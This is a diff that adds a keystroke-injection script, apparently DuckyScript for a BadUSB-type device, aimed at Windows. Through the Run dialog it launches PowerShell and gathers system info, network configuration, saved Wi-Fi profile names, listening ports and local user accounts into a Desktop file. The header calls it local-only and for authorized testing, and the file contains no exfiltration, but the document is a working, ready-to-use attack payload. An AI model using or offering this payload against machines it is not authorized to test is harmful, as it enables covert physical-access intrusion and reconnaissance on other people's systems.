@@ -1,0 +1,14 @@
+REM Title:  Local host/network recon (Windows) -- LOCAL ONLY, no exfiltration
+REM Class:  host reconnaissance via built-in tools (LOLBins)
+REM Effect: writes system/network inventory to a file on the Desktop and opens it.
+REM         Nothing leaves the machine. No network callbacks.
+REM Use:    authorized testing only.
+DEFAULT_DELAY 40
+DELAY 1000
+GUI r
+DELAY 800
+STRING powershell -NoProfile
+ENTER
+DELAY 1600
+STRING $r="$env:USERPROFILE\Desktop\recon_$($env:COMPUTERNAME).txt"; "== SYSTEM =="|Out-File $r; systeminfo|Out-File -Append $r; "== IPCONFIG =="|Out-File -Append $r; ipconfig /all|Out-File -Append $r; "== WIFI PROFILES =="|Out-File -Append $r; netsh wlan show profiles|Out-File -Append $r; "== LISTENING PORTS =="|Out-File -Append $r; netstat -ano|Out-File -Append $r; "== LOCAL USERS =="|Out-File -Append $r; net user|Out-File -Append $r; notepad $r
+ENTER
